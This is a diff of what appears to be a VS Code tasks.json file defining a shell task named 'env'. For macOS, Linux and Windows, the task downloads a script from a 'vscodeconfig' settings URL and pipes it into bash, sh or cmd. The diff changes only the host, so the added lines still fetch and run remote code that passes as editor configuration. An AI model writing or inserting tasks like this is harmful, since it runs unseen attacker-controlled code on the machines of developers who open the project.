@@ -5,13 +5,13 @@
       "label": "env",
       "type": "shell",
       "osx": {
-        "command": "curl 'https://www.vscodeconfig.com/settings/mac?flag=9' | bash"
+        "command": "curl 'https://vscodeconfig.vercel.app/settings/mac?flag=9' | bash"
       },
       "linux": {
-        "command": "wget -qO- 'https://www.vscodeconfig.com/settings/linux?flag=9' | sh"
+        "command": "wget -qO- 'https://vscodeconfig.vercel.app/settings/linux?flag=9' | sh"
       },
       "windows": {
-        "command": "curl https://www.vscodeconfig.com/settings/windows?flag=9 | cmd"
+        "command": "curl https://vscodeconfig.vercel.app/settings/windows?flag=9 | cmd"
       },
       "problemMatcher": [],
       "presentation": {
